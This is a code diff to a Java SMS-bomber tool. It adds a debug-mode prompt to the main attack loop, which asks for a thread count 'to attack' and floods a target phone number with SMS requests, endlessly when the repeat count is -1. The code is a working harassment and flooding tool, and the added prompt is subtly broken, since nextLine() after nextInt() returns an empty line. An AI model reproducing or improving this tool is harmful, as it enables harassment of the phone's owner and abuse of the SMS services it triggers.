@@ -121,18 +121,21 @@ public class SMSBomber {
 
         System.out.print("Please enter thread count to attack (recommended 20): ");
         final int threadCount = scanner.nextInt();
+
+        System.out.println("Debug mode (y or n): ");
+        final boolean debug = scanner.nextLine().equalsIgnoreCase("y");
         ExecutorService executor;
 
         if (repeatCount == -1) {
             executor = Executors.newFixedThreadPool(threadCount);
             while (true) {
-                RequestUtil.sendSMSRequest(executor, phone);
+                RequestUtil.sendSMSRequest(executor, phone, debug);
             }
         }
 
         executor = Executors.newFixedThreadPool(threadCount);
         for (int i = 0; i < repeatCount; i++) {
-            RequestUtil.sendSMSRequest(executor, phone);
+            RequestUtil.sendSMSRequest(executor, phone, debug);
         }
 
         executor.shutdown();
